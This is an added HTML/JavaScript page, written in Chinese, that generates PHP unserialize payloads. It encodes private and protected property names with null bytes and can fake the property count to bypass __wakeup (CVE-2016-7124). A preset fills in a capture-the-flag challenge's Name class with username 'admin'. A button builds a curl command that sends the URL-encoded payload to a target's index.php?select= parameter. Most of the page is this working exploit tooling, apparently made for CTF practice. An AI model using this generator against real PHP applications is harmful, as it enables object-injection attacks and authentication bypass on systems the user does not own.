@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>PHP 序列化生成器 · web-fast</title>
+<style>
+:root{
+  --bg:#0b0f16; --bg2:#111823; --bg3:#161f2c; --line:#232f3f;
+  --fg:#e6edf6; --fg2:#9fb0c7; --dim:#6b7c93;
+  --accent:#58a6ff; --green:#56d364; --yellow:#e3b341; --red:#ff7b72;
+  --mono:"JetBrains Mono","Cascadia Mono",Consolas,monospace;
+  --ui:"Segoe UI","Microsoft YaHei UI",sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--fg);font-family:var(--ui);font-size:13.5px;
+  padding:26px 20px;line-height:1.6}
+.wrap{max-width:920px;margin:0 auto}
+h1{font-size:19px;font-weight:650;margin-bottom:4px}
+.sub{color:var(--dim);font-size:12.5px;margin-bottom:22px}
+.card{background:var(--bg2);border:1px solid var(--line);border-radius:12px;
+  padding:18px 20px;margin-bottom:16px}
+.label{font-size:12px;color:var(--fg2);margin-bottom:7px;display:block}
+input,select{background:#0a0e14;border:1px solid #2a3546;border-radius:7px;
+  color:var(--fg);padding:8px 11px;font-family:var(--mono);font-size:13px;outline:0}
+input:focus,select:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(88,166,255,.12)}
+.row{display:flex;gap:9px;align-items:center;margin-bottom:9px}
+.row .vis{width:104px;flex:0 0 104px}
+.row .name{width:180px;flex:0 0 180px}
+.row .eq{color:var(--dim)}
+.row .val{flex:1;min-width:0}
+.row .del{background:none;border:1px solid #2a3546;color:var(--dim);
+  width:30px;height:34px;border-radius:7px;cursor:pointer;font-size:15px}
+.row .del:hover{color:var(--red);border-color:rgba(255,123,114,.4)}
+button{font-family:var(--ui);font-size:13px;cursor:pointer;border-radius:7px;
+  border:1px solid #2a3546;background:#161f2c;color:var(--fg2);padding:8px 15px;
+  transition:all .13s}
+button:hover{background:#1e2836;color:#fff;border-color:#3c4a60}
+button.primary{background:#1f6feb;border-color:#1f6feb;color:#fff}
+button.primary:hover{background:#2f81f7}
+button.add{margin-top:4px}
+.out{background:#080c12;border:1px solid #2a3546;border-radius:9px;
+  padding:14px;font-family:var(--mono);font-size:13px;line-height:1.75;
+  word-break:break-all;white-space:pre-wrap;min-height:70px;color:#d6deeb}
+mark{background:rgba(227,179,65,.22);color:var(--yellow);border-radius:3px;
+  padding:0 2px;font-weight:600}
+.meta{display:flex;gap:18px;margin-top:10px;font-size:11.5px;color:var(--dim);
+  font-family:var(--mono)}
+.fake{display:flex;align-items:center;gap:10px;margin-top:14px;
+  padding:11px 13px;background:rgba(227,179,65,.07);border:1px solid rgba(227,179,65,.2);
+  border-radius:8px}
+.fake input{width:80px}
+.fake .tip{font-size:11.5px;color:#a8842f;line-height:1.5}
+.btns{display:flex;gap:9px;margin-top:14px;flex-wrap:wrap}
+.preset{margin-top:10px}
+.preset button{font-size:12px;padding:6px 12px}
+.hint{font-size:11.5px;color:var(--dim);margin-top:8px}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <h1>PHP 序列化生成器</h1>
+  <div class="sub">填属性，自动拼出 payload。空字节显示成 <mark>\0</mark>，不用再自己数长度。</div>
+
+  <div class="card">
+    <span class="label">类名</span>
+    <input id="cls" value="Name" style="width:260px">
+
+    <div style="height:16px"></div>
+    <span class="label">属性</span>
+    <div id="props"></div>
+    <button class="add" onclick="addProp()">+ 加一个属性</button>
+  </div>
+
+  <div class="card">
+    <div class="fake">
+      <span class="label" style="margin:0">伪造属性个数</span>
+      <input id="fake" type="number" min="1" placeholder="自动">
+      <div class="tip">留空 = 用真实个数。填比真实数大的值，生成 <code>O:4:"X":<b>3</b>:{...}</code>，用于绕过 __wakeup（CVE-2016-7124，PHP &lt; 7.4）。</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <span class="label">输出</span>
+    <div class="out" id="out"></div>
+    <div class="meta">
+      <span>字节数 <b id="bytes">0</b></span>
+      <span>属性数 <b id="cnt">0</b></span>
+      <span id="status"></span>
+    </div>
+    <div class="btns">
+      <button class="primary" onclick="copyRaw()">复制原始串</button>
+      <button onclick="copyEnc()">复制 URL 编码</button>
+      <button onclick="download()">下载 payload.txt</button>
+      <button onclick="copyEnc2()">复制并打靶（curl 命令）</button>
+    </div>
+    <div class="hint" id="hint"></div>
+  </div>
+
+  <div class="card">
+    <span class="label">预设</span>
+    <div class="preset">
+      <button onclick="presetCat()">这道题的 Name（username=admin, password=100）</button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+const outEl = document.getElementById('out');
+let rawPayload = '';
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function byteLen(s) {
+  return new TextEncoder().encode(s).length;
+}
+
+function sstr(v) {
+  return 's:' + byteLen(v) + ':"' + v + '";';
+}
+
+function propRealName(cls, vis, name) {
+  if (vis === 'private') return '\x00' + cls + '\x00' + name;
+  if (vis === 'protected') return '\x00*\x00' + name;
+  return name;
+}
+
+function addProp(vis, name, value) {
+  const box = document.getElementById('props');
+  const row = document.createElement('div');
+  row.className = 'row prop';
+  row.innerHTML =
+    '<select class="vis">'
+    + '<option value="private">private 私有</option>'
+    + '<option value="protected">protected 保护</option>'
+    + '<option value="public">public 公有</option>'
+    + '</select>'
+    + '<input class="name" placeholder="属性名">'
+    + '<span class="eq">=</span>'
+    + '<input class="val" placeholder="值">'
+    + '<button class="del" title="删掉">×</button>';
+  box.appendChild(row);
+  row.querySelector('.del').onclick = () => { row.remove(); build(); };
+  row.querySelectorAll('input,select').forEach(el => {
+    el.addEventListener('input', build);
+    el.addEventListener('change', build);
+  });
+  if (vis) row.querySelector('.vis').value = vis;
+  if (name) row.querySelector('.name').value = name;
+  if (value !== undefined) row.querySelector('.val').value = value;
+  build();
+}
+
+function build() {
+  const cls = document.getElementById('cls').value || 'Name';
+  const rows = [...document.querySelectorAll('.row.prop')];
+  const props = rows.map(r => ({
+    vis: r.querySelector('.vis').value,
+    name: r.querySelector('.name').value.trim(),
+    value: r.querySelector('.val').value,
+  })).filter(p => p.name);
+
+  const fakeInput = document.getElementById('fake').value.trim();
+  const realCount = props.length;
+  const count = fakeInput ? parseInt(fakeInput, 10) : realCount;
+
+  let body = '';
+  for (const p of props) {
+    body += sstr(propRealName(cls, p.vis, p.name)) + sstr(p.value);
+  }
+  rawPayload = 'O:' + byteLen(cls) + ':"' + cls + '":' + count + ':{' + body + '}';
+
+  // 显示时空字节用可见标记
+  outEl.innerHTML = esc(rawPayload).replace(/\u0000/g, '<mark>\\0</mark>');
+
+  document.getElementById('bytes').textContent = byteLen(rawPayload);
+  document.getElementById('cnt').textContent = realCount;
+  const st = document.getElementById('status');
+  if (fakeInput && count > realCount) {
+    st.innerHTML = '<span style="color:#56d364">✓ 伪造了 ' + count + '（真实 ' + realCount + '），会绕过 __wakeup</span>';
+  } else if (fakeInput && count <= realCount) {
+    st.innerHTML = '<span style="color:#ff7b72">⚠ 伪造值不大于真实值，不会触发绕过</span>';
+  } else {
+    st.textContent = '';
+  }
+
+  const hint = document.getElementById('hint');
+  hint.textContent = props.length
+    ? '提示：private 属性的真实名字是 空字节+类名+空字节+属性名，上面显示成 \\0 只是给你看的，复制出来是真空字节。'
+    : '还没有属性';
+}
+
+document.getElementById('cls').addEventListener('input', build);
+document.getElementById('fake').addEventListener('input', build);
+
+function copyText(t) {
+  navigator.clipboard.writeText(t).then(
+    () => flash('已复制'),
+    () => flash('复制失败，手动选中'));
+}
+
+function copyRaw() { copyText(rawPayload); }
+function copyEnc() { copyText(encodeURIComponent(rawPayload)); }
+function copyEnc2() {
+  copyText('curl.exe -s -k "' + 'https://靶机/index.php?select=' + encodeURIComponent(rawPayload) + '"');
+}
+function download() {
+  const blob = new Blob([rawPayload], {type:'text/plain'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'payload.txt';
+  a.click();
+}
+function flash(msg) {
+  const el = document.getElementById('hint');
+  const old = el.textContent;
+  el.textContent = msg;
+  el.style.color = '#56d364';
+  setTimeout(() => { el.textContent = old; el.style.color = ''; }, 1200);
+}
+
+function presetCat() {
+  document.getElementById('props').innerHTML = '';
+  document.getElementById('cls').value = 'Name';
+  document.getElementById('fake').value = '3';
+  addProp('private', 'username', 'admin');
+  addProp('private', 'password', '100');
+  build();
+}
+
+// 初始
+presetCat();
+</script>
+</body>
+</html>
